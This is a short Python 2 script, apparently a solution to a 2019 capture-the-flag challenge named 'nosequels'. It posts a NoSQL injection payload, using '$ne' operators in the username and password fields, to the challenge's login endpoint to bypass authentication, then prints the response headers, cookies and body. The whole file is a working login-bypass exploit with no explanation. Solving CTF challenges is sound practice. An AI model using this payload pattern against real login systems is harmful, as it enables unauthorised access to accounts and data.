# python2
# coding = utf-8
import requests
import sys
import json

url = 'https://nosequels.2019.chall.actf.co/login'
# cookie = {'token': sys.argv[1]}
cookie = {'token': sys.argv[1]}
header = {'Content-Type' : 'application/json'}
data = '{"username":{"$ne":"1"}, "password":{"$ne":"1"}}'
proxy = {'http':'127.0.0.1:8080'}


res = requests.post(
url = 'https://nosequels.2019.chall.actf.co/login',
#url = 'http://127.0.0.1:8080',
  #proxies = proxy,
  headers = header, 
  cookies = cookie,
  #data = json.dumps(data)
  data = data,
  allow_redirects = False
)



print res.headers
print res.cookies
print res.text
print res.content
